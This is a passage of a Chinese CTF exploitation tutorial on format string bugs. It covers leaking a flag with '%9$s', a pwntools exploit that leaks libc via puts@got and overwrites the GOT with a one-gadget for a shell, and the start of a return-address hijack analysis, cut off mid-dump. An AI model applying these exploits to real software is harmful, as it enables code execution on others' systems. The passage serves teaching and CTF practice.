\u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc7 64 \u4f4d\u51fd\u6570\u7684\u524d 6 \u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f \u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002 \u4f8b\u5b50 \u00b6 \u786e\u5b9a\u4fdd\u62a4 \u00b6 \u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5 2017 \u5e74\u7684 UIUCTF \u4e2d pwn200 GoodLuck \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2a flag.txt \u6587\u4ef6\u3002 \u279c 2017 -UIUCTF-pwn200-GoodLuck git: ( master ) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86 Canary\u3001NX \u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206 RELRO \u4fdd\u62a4\u3002 \u5206\u6790\u7a0b\u5e8f \u00b6 \u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e for ( j = 0 ; j <= 21 ; ++ j ) { v5 = format [ j ]; if ( ! v5 || v11 [ j ] != v5 ) { puts ( \"You answered:\" ); printf ( format ); puts ( \" \\n But that was totally wrong lol get rekt\" ); fflush ( _bss_start ); result = 0 ; goto LABEL_11 ; } } \u53ef\u4ee5\u770b\u5230 flag \u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a 5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a 4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a 64 \u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d 6 \u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt \u5b57\u7b26\u4e32\u5b58\u50a8\u5728 RDI \u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5 fmt \u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a 10\u3002\u800c fmt \u5b57\u7b26\u4e32\u4e2d %order$s \u5bf9\u5e94\u7684 order \u4e3a fmt \u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165 %9$s \u5373\u53ef\u5f97\u5230 flag \u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528 https://github.com/scwuaptx/Pwngdb \u4e2d\u7684 fmtarg \u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002 gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987b break \u5728 printf \u5904\u3002 \u6765\u81ea resery \u5e08\u5085\u6ce8\u89e3\uff1a \u8fd9\u91cc\u7684 10 \u662f\u7531 5+5 \u5f97\u5230\u7684\uff0c\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u662f\u8fd9\u4e24\u4e2a 5 \u662f\u4ece\u54ea\u91cc\u7684\u5f97\u5230\u7684\uff0c\u6211\u6765\u89e3\u91ca\u4e00\u4e0b\uff0c\u524d\u9762\u7684 5\uff1a\u7531\u4e8e 64 \u4e3a\u7a0b\u5e8f\uff0c\u524d 64 \u4e2a\u53c2\u6570\u662f\u5b58\u5728\u5bc4\u5b58\u5668\u4e2d\u7684\uff0c\u5206\u522b\u662f rdi\uff0crsi\uff0crcx\uff0crdx\uff0cr8\uff0cr9\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u50a8\u5728 rdi \u4e2d\u7684\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u504f\u79fb\u5c31\u5e94\u8be5\u662f 5+flag \u5728\u6808\u4e2d\u7684\u504f\u79fb\uff0c\u5728\u6808\u4e2d\u7684\u504f\u79fb\u5c31\u5f88\u597d\u7406\u89e3\u4e86\u5c31\u662f 5\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 10 \u6ce8\u89e3 \u6211\u5b89\u88c5\u7684 Pwndbg \u5e76\u6ca1\u6709 fmtarg \uff0c\u53ef\u80fd\u662f\u7248\u672c\u4e0d\u5bf9\uff0c\u5982\u679c\u9700\u8981\u5b89\u88c5\u4e00\u4e0b gef \u63d2\u4ef6\u3002 \u4e24\u4e2a\u4f5c\u8005\u90fd\u89e3\u91ca\u4e86\u504f\u79fb 10 \u662f\u600e\u4e48\u8ba1\u7b97\u6765\uff0c\u4f46\u6211\u66f4\u559c\u6b22\u7684\u65b9\u6cd5\u662f**\u8f93\u5165\u4e00\u957f\u4e32 %p \u5f97\u51fa\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u7136\u540e\u518d\u8ba1\u7b97\u76ee\u6807\u504f\u79fb\u6216\u5730\u5740**\u3002 $ ./goodluck what ' s the flag bbbbbbbb%p%p%p%p%p%p%p%p%p%p%p You answered: bbbbbbbb0x6020100x7ffff7dd37800x7ffff7b042c00x7ffff7fdc7000x7ffff7fdc7010x620000010x6028300x6020100x7fffffffdd300x6161617b67616c660x6161616161616161 But that was totally wrong lol get rekt 0x602830 \u662f\u7b2c 7 \u4f4d\u3002\u4e3a\u4ec0\u4e48\u6cc4\u9732\u7684\u4e0d\u662f 0x6262626262626262 \uff1f\u524d\u9762\u63d0\u5230\u4e86\uff0c64 \u4f4d\u7cfb\u7edf\u7684\u524d\u516d\u4e2a\u53c2\u6570\u662f\u5bc4\u5b58\u5668\u4f20\u53c2\u7684\uff0c\u800c bbbbbbbb \u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u81ea\u7136\u5728\u5bc4\u5b58\u5668\u4e2d\u5b58\u653e\uff0c0x602830 \u5c31\u662f\u5b58\u50a8\u7684\u5bc4\u5b58\u5668\u5730\u5740\u3002\u600e\u4e48\u83b7\u5f97\u8fd9\u4e2a\u5730\u5740\uff1fgdb \u8c03\u8bd5\u65ad\u70b9\u6253\u5728 printf \u51fd\u6570\uff1a \u8fd9\u6837\u5f97\u51fa\u6700\u540e\u7684 flag \u504f\u79fb\u4e3a 10 \u3002 \u5229\u7528\u7a0b\u5e8f \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # \u8fd9\u4e2a\u5e93\u6ca1\u6709\u7528\u5230\u53ef\u4ee5\u6ce8\u91ca\u6389 # from LibcSearcher import * goodluck = ELF ( './goodluck' ) if args [ 'REMOTE' ]: sh = remote ( 'pwn.sniperoj.cn' , 30017 ) else : sh = process ( './goodluck' ) payload = \"%9$s\" print payload ##gdb.attach(sh) sh . sendline ( payload ) print sh . recv () sh . interactive () hijack GOT \u00b6 \u539f\u7406 \u00b6 \u5728\u76ee\u524d\u7684 C \u7a0b\u5e8f\u4e2d\uff0clibc \u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7 GOT \u8868\u6765\u8df3\u8f6c\u7684\uff08\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\uff09\u3002\u6b64\u5916\uff0c\u5728\u6ca1\u6709\u5f00\u542f RELRO \u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2a libc \u7684\u51fd\u6570\u5bf9\u5e94\u7684 GOT \u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2a libc \u51fd\u6570\u7684 GOT \u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 printf \u7684 got \u8868\u9879\u5185\u5bb9\u4e3a system \u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884c printf \u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570 A \u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570 B \u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u3002 \u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570 A \u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002\uff08\u56e0\u4e3a\u8fd9\u7c7b\u51fd\u6570\u4f1a\u5728\u7a0b\u5e8f\u6e90\u7801\u4e2d\u4f7f\u7528\u5230\uff0c\u6240\u4ee5\u80fd\u76f4\u63a5\u6216\u95f4\u63a5\u4ece elf \u6587\u4ef6\u4e2d\u8bfb\u53d6\uff09 \u786e\u5b9a\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740 \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570 B \u7684\u5730\u5740\u3002 \u5c06\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u5904\u3002 \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd \u5199\u5165\u51fd\u6570\uff1awrite \u51fd\u6570\uff08\u5e38\u89c1\uff09 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199\uff08\u5e38\u89c1\uff09 ROP pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 CCTF \u4e2d\u7684 pwn3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u786e\u5b9a\u4fdd\u62a4 \u00b6 \u5982\u4e0b \u279c 2016 -CCTF-pwn3 git: ( master ) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002RELRO \u662f\u90e8\u5206\u4fdd\u62a4\uff0c\u8fd9\u79cd\u72b6\u6001\u4e0b\u53ef\u4ee5\u4fee\u6539 GOT \u8868\uff0c\u5982\u679c\u662f FULL \u5219\u4e0d\u884c\u3002\u53e6\u5916\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542f ASLR \u4fdd\u62a4\u7684\u3002 \u5206\u6790\u7a0b\u5e8f \u00b6 \u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684 ftp\uff0c\u5177\u6709 get\uff0cput\uff0cdir \u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728 get \u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int get_file () { char dest ; // [sp+1Ch] [bp-FCh]@5 char s1 ; // [sp+E4h] [bp-34h]@1 char * i ; // [sp+10Ch] [bp-Ch]@3 printf ( \"enter the file name you want to get:\" ); __isoc99_scanf ( \"%40s\" , & s1 ); if ( ! strncmp ( & s1 , \"flag\" , 4u ) ) puts ( \"too young, too simple\" ); for ( i = ( char * ) file_head ; i ; i = ( char * ) * (( _DWORD * ) i + 60 ) ) { if ( ! strcmp ( i , & s1 ) ) { strcpy ( & dest , i + 0x28 ); //\u5c06\u5185\u5bb9\u590d\u5236\u5230dest return printf ( & dest ); //\u8f93\u51fadest\u5185\u5bb9 } } return printf ( & dest ); } \u6f0f\u6d1e\u5229\u7528\u601d\u8def \u00b6 \u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f \u00b6 \u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : filename.py from pwn import * context . log_level = 'debug' p = process ( \"./pwn3\" ) elf = ELF ( \"./pwn3\" ) libc = ELF ( \"./libc.so\" ) def creat ( name , content ): p . recvuntil ( \"ftp>\" ) p . sendline ( \"put\" ) p . recvuntil ( \"upload:\" ) p . sendline ( name ) p . recvuntil ( \"content:\" ) p . sendline ( content ) def show ( name ): p . recvuntil ( \"ftp>\" ) p . sendline ( \"get\" ) p . recvuntil ( \"get:\" ) p . sendline ( name ) def showlist (): p . recvuntil ( \"ftp>\" ) p . sendline ( \"dir\" ) name = \"rxraclhm\" puts_got = elf . got [ 'puts' ] log . info ( \"puts_got:\" + hex ( puts_got )) p . recvuntil ( \"Rainism):\" ) p . sendline ( name ) # leak libc payload = \"%8$s\" + p32 ( puts_got ) creat ( 'aaaa' , payload ) show ( 'aaaa' ) puts_leak = u32 ( p . recv ( 4 )) log . info ( \"puts_leak:\" + hex ( puts_leak )) libc_base = puts_leak - libc . symbols [ 'puts' ] log . info ( \"libc_base:\" + hex ( libc_base )) system = libc_base + libc . symbols [ 'system' ] log . info ( \"system:\" + hex ( system )) binsh = libc_base + libc . search ( '/bin/sh' ) . next () log . info ( \"binsh:\" + hex ( binsh )) onegadget = libc_base + 0x3ac62 log . info ( \"onegadget:\" + hex ( onegadget )) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload ( 7 , { puts_got : onegadget }) creat ( 'bbbb' , payload ) show ( 'bbbb' ) p . interactive () exp \u66ff\u6362\u6211\u5199\u5f97\u7248\u672c\uff0c\u8fd9\u6761\u9898\u76ee\u7684\u5b8c\u6574 WP \uff1a 2016_CCTF_pwn3_writeup \u6ce8\u610f \u6211\u5728\u83b7\u53d6 puts \u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f 8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d 4 \u4e2a\u5b57\u8282\u5c31\u662f puts \u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f 7\u3002 \u6ce8\u89e3 \uff1a\u7ed3\u5408 payload \u6765\u770b\uff1a payload = \"%8$s\" + p32(puts_got) \uff0c %8$S \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 7\uff1b p32(puts_got) \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 8 ; \u8fd9\u91cc\u6211\u5229\u7528\u4e86 pwntools \u4e2d\u7684 fmtstr_payload \u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91cc fmtstr_payload(7, {puts_got: system_addr}) \u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f 7\uff0c\u6211\u5e0c\u671b\u5728 puts_got \u5730\u5740\u5904\u5199\u5165 system_addr \u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002 hijack retaddr \u00b6 \u539f\u7406 \u00b6 \u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 \u4e09\u4e2a\u767d\u5e3d - pwnme_k0 \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002 \u786e\u5b9a\u4fdd\u62a4 \u00b6 \u279c \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git:(master) \u2717 checksec pwnme_k0 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4ee5\u53ca Full RELRO \u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684 got \u8868\u4e86\u3002 \u5206\u6790\u7a0b\u5e8f \u00b6 \u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int __usercall sub_400B07 @ < eax > ( char format @ < dil > , char formata , __int64 a3 , char a4 ) { write ( 0 , \"Welc0me to sangebaimao! \\n \" , 0x1AuLL ); printf ( & formata , \"Welc0me to sangebaimao! \\n \" ); return printf ( & a4 + 4 ); } \u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a &a4 + 4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 password \u5185\u5bb9\u4e5f\u662f v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); \u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 username \u5728\u8ddd\u79bb\u7684 password 20 \u4e2a\u5b57\u8282\u3002 puts ( \"Input your username(max lenth:20): \" ); fflush ( stdout ); v8 = read ( 0 , & bufa , 0x14uLL ); if ( v8 && v8 <= 0x14u ) { puts ( \"Input your password(max lenth:20): \" ); fflush ( stdout ); v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); fflush ( stdout ); * ( _QWORD * ) buf = bufa ; * ( _QWORD * )( buf + 8 ) = a3 ; * ( _QWORD * )( buf + 16 ) = a4 ; \u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002 \u5229\u7528\u601d\u8def \u00b6 \u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684 shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u5728 0x00000000004008A6 \u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528 system('bin/sh') \u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86 shell\u3002 \u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8e rbp \u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002 \u6ce8\u89e3 \uff1a \u4e0a\u9762\u8fd9\u53e5\u8bdd\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff1a\u6709\u4e00\u4e2a\u72ec\u7acb\u51fd\u6570 A \u7684\u6808\u5e27\uff0c\u8fd9\u4e2a A \u6808\u5e27\u6574\u4f53\u5b58\u653e\u5730\u5740\u662f\u52a8\u6001\u53d8\u5316\u7684\u3002\u4f46\u662f A \u6808\u5e27\u5185\u90e8\u7684\u7ed3\u6784\u662f\u56fa\u5b9a\u7684\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1arbp \u4e00\u5b9a\u5728 rip \u524d\u9762\uff08\u4f4e\u5730\u5740\uff09\u3002\u8fd8\u6709\u6211\u4eec\u77e5\u9053\u7684\u662f rbp \u5b58\u50a8\u7684\u662f\u4e0a\u4e00\u4e2a\u6808\u5e27\u7684 rbp \u5730\u5740\uff0c\u5982\u679c\u8bf4\u6bcf\u6b21\u90fd\u662f\u901a\u8fc7\u51fd\u6570 B \u8c03\u7528\u51fd\u6570 A \uff0c\u56e0\u4e3aAB \u6808\u5e27\u957f\u5ea6&\u7ed3\u6784\u56fa\u5b9a\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6cc4\u9732\u51fd\u6570 A rbp \u7684\u503c\u51cf\u53bb\u504f\u79fb\u5f97\u5230\u51fd\u6570 A rip \u5730\u5740\u3002 \u5229\u7528\u601d\u8def\u5982\u4e0b \u786e\u5b9a\u504f\u79fb \u83b7\u53d6\u51fd\u6570\u7684 rbp \u4e0e\u8fd4\u56de\u5730\u5740 \u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740 \u5c06\u6267\u884c system \u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 \u786e\u5b9a\u504f\u79fb \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540d aaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2a printf(&a4 + 4) \u51fd\u6570\u5904 Register Account first! Input your username ( max lenth:20 ) : aaaaaaaa Input your password ( max lenth:20 ) : %p%p%p%p%p%p%p%p%p%p Register Success!! 1 .Sh0w Account Infomation! 2 .Ed1t Account Inf0mation! 3 .QUit sangebaimao: ( >error options 1 .Sh0w Account Infomation! 2 .Ed1t Account Inf0mation! 3 .QUit sangebaimao: ( >1 ... \u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386:x86-64 ] \u2500\u2500\u2500\u2500 0x400b1a call 0x400758 0x400b1f lea rdi, [ rbp+0x10 ] 0x400b23 mov eax, 0x0 \u2192 0x400b28 call 0x400770 \u21b3 0x400770 jmp QWORD PTR [ rip+0x20184a ] # 0x601fc0 0x400776 xchg ax, ax 0x400778 jmp QWORD PTR [ rip+0x20184a ] # 0x601fc8 0x40077e xchg ax, ax \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp , $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 